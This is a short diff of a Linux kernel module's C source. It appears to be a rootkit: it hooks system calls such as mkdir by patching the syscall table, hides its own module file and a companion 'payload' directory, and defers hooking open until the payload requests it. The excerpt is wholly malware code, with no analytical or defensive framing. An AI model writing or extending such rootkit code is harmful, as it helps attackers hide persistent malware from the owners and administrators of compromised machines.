@@ -43,8 +43,8 @@ int init_module() {
 	patch(SYS_mkdir, mkdirShim);
 	//patch(SYS_fork, forkShim);
 	//patch(SYS_clone, cloneShim);
-	patch(SYS_open, openShim);
-	patch(SYS_close, closeShim);
+	//patch(SYS_open, openShim); This one is patched later, on request of the payload. This is because doing this during boot results in an error.
+	//patch(SYS_close, closeShim);
 
 	//request module and payload to be hidden
 	hideDirectory(secret_ko_name);
@@ -59,7 +59,7 @@ void cleanup_module() {
 	//The API can be called to deactivate the module.
 
 	//restore the system call table, in reverse order
-	unpatch(SYS_close);
+	//unpatch(SYS_close);
 	unpatch(SYS_open);
 	//unpatch(SYS_clone);
 	//unpatch(SYS_fork);
